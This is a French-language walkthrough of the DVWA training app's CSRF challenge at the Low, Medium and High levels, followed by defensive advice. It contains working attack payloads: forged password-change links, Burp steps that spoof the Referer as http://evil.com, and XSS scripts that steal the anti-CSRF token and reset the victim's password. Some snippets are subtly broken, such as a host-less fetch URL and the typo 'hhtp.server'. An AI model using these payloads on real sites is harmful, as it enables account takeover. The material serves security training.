
# DVWA CSRF (Low → Medium → High)

## 🔎 Rappel CSRF
CSRF = forcer un utilisateur déjà authentifié à exécuter une action (ex: changer son mot de passe) via une requête forgée (lien, image, formulaire caché).  


## 🟢 Low

### Fonctionnement
- Formulaire "Change password" sans token CSRF, seulement `password_new` et `password_conf`.
- Requête en `GET` avec les paramètres dans l’URL.

### Exploit
1. Change ton mot de passe normalement.
2. Copie l’URL dans la barre (elle contient `password_new=...&password_conf=...`).
3. Colle-la dans un `<img>` ou un lien malveillant, par exemple :

```html
<a href="http://ipdvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
Clique ici pour voir une image
</a>
Si la victime est connectée, son mot de passe est changé.

```
## 🟢 Low - Exploit

### Test
1. DVWA → CSRF → Change password
2. Copie l'URL générée
3. Ouvre csrf-exploit-low.html (remplace IP)

### Mécanismes
- **Lien** : `GET` direct
- **Image** : `<img src="malicious">` (auto‑exécuté)
- **Auto‑form** : JavaScript submit invisible

python -m http.server 
firefox : http://127.0.0.1:8000/exploit-crsf.html

**Screenshot** : [mot de passe changé sans consentement]


## 🟡 Medium

### Protection ajoutée
- Vérification de l’en-tête `Referer` : la requête doit venir du site DVWA lui‑même.
Après analyse du code, on constate qu'il vérifie la présence du nom du serveur dans l'URL. Si c'est le cas, la procédure de changement de mot de passe se poursuit. Cette vérification garantit que la requête provient d'une page du même domaine, empêchant ainsi les requêtes provenant de sites externes ou malveillants.  

# Burp
1. Burp → Proxy → Intercept ON  
2. DVWA → Change Password : new=1234 / conf=1234  
3. Intercept requête POST/GET  
4. Drop → Repeater  
5. Referer → http://evil.com  
6. Send → Password changée !  
Intercepter la requête invalide et injecter l'en-tête Referer correct. Ainsi, nous pourrons faire croire que la requête provient d'une source légitime, ce qui nous permettra de contourner les contrôles de sécurité qui s'appuient sur l'en-tête Referer pour la validation.  

**HTML explotcrsfmedium.html PoC (serveur 8080)**
<!DOCTYPE>
<html>
<body>
<a href="http://localhost:8080@localhost:42001/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change">
Clique pour gagner !
</a>
</body>
</html>
python -m hhtp.server  
firefox ; http://127.0.0.1:8000/explotcrsfmedium.html  


### Idée exploit via XSS Réléchi
- Utiliser une autre vuln (par ex. XSS réfléchi) pour injecter le formulaire CSRF **depuis** DVWA, donc avec un `Referer` correct.
- Exemple simple :  

XSS Reflected (classique)
DVWA XSS(R) → payload :
text
<script>
window.location="http://ipdvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
</script>

---

## 🟠 High

### Protection
- Token CSRF dans le formulaire (`user_token` ou similaire), vérifié côté serveur.
- Le token change à chaque requête.

Le code récupère le jeton anti-CSRF, le nouveau mot de passe et sa confirmation à partir du corps de la requête. Le jeton anti-CSRF permet de vérifier la légitimité de la requête et de s'assurer de sa correspondance avec le jeton de session. Chaque fois que l'utilisateur clique sur le bouton « Modifier », un nouveau jeton anti-CSRF est généré. Cette unicité contribue à protéger contre les attaques par force brute et empêche les tentatives malveillantes de modification de mot de passe via des pages trompeuses.  

En inspectant le code source de la page web, nous pouvons visualiser le jeton utilisateur caché, qui est inclus dans les données du formulaire.  
## Burp
en examinant la requête interceptée dans Burp Suite, nous pouvons observer que le jeton anti-CSRF est transmis avec la requête.  

DVWA CSRF **High** = **user_token obligatoire** (`checkToken()`) → **XSS required** pour voler token !
## Code High (standard)
```
checkToken($_REQUEST['user_token'], $_SESSION['session_token'])
→ Token random par page → XSS pour fetch !
```
## Exploit chain : XSS → CSRF
### Étape 1 : XSS Stored/Reflected (High compatible)
**XSS Stored** (DVWA guestbook) :
```
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://ipdvwa/vulnerabilities/csrf/', false);
xhr.onload = function() {
  var parser = new DOMParser();
  var doc = parser.parseFromString(xhr.responseText, 'text/html');
  var token = doc.querySelector('input[name="user_token"]').value;
  var xhr2 = new XMLHttpRequest();
  xhr2.open('GET', `http://ipdvwa/vulnerabilities/csrf/?user_token=${token}&password_new=hacked123&password_conf=hacked123&Change=Change`, false);
  xhr2.send();
};
xhr.send();
</script>
```
### Étape 2 : XSS Reflected (si Stored impossible)
**Payload courte** (High XSS_R limite) :
```
<img src=x onerror="fetch('http://ipdvwa/csrf/?user_token='+document.querySelector('[name=user_token]').value+'&password_new=hacked')">
```
**Limite** : Token pas visible → **Stored XSS** préférable
## PoC complet (high-csrf.html)
```html
<!-- Serveur attaquant : python -m http.server 8080 -->
<script src="http://localhost:8080/high.js"></script>
```
**high.js** :
```js
// Fetch token + CSRF
fetch('http://vulnerabilities/csrf/')
.then(r=>r.text())
.then(html=> {
  let token = html.match(/name="user_token" value="([^"]+)"/);
  fetch(`http://ipdvwa/vulnerabilities/csrf/?user_token=${token}&password_new=hacked123&password_conf=hacked123&Change=Change`);
});
```

****
**XSS Stored** → **steal token** → **password admin = hacked123** !

**Test** : **XSS Stored High** → **CSRF fire** ?
---

## 🛡️ Bonnes pratiques (défense)

- Utiliser les protections CSRF intégrées du framework (Django, Laravel, Symfony, Spring, etc.).  
- Ajouter un **token CSRF imprévisible** dans tous les formulaires modifiant l’état, et vérifier le token côté serveur. 
- Activer l’attribut **SameSite** sur les cookies de session (`Lax` ou `Strict`) pour limiter l’envoi cross‑site.   
- Éviter d’utiliser **GET** pour des actions sensibles (utiliser POST + token). 

## Resources:
https://medium.com/@waeloueslati18/exploring-dvwa-a-walkthrough-of-the-csrf-challenge-part-3-16fca751838a  
https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/  
https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/csrf.md  

```

